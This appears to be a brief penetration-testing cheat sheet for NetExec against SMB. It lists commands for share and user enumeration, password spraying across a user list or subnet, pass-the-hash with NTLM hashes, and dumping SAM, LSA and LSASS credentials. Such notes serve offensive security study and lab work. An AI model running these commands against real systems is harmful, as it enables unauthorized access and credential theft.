Can add `--users`, `--shares`, `--loggedon-users`, `--groups`, `-M spider_plus --share $share`

Password spraying:
- `nxe smb $IP -u users.txt -p 'password' -d domain.com --continue-on-success`
	- `-u` for either $user or $userfile, same with `-p`. 
	- can also do `0/24` for the whole domain
	- `--pass-pol` to get the password policy

Pass the hash
`nxe smb $IP -u $user -H $NTLMHash --local-auth`
- can append `--sam` at the end if we get a `Pwn3d!`
- or `--lsa` 
- or `--shares`

Modules 
`nxe smb $IP -u $user -H $NTLMHash --local-auth -M $module`
- such as `lsassy`


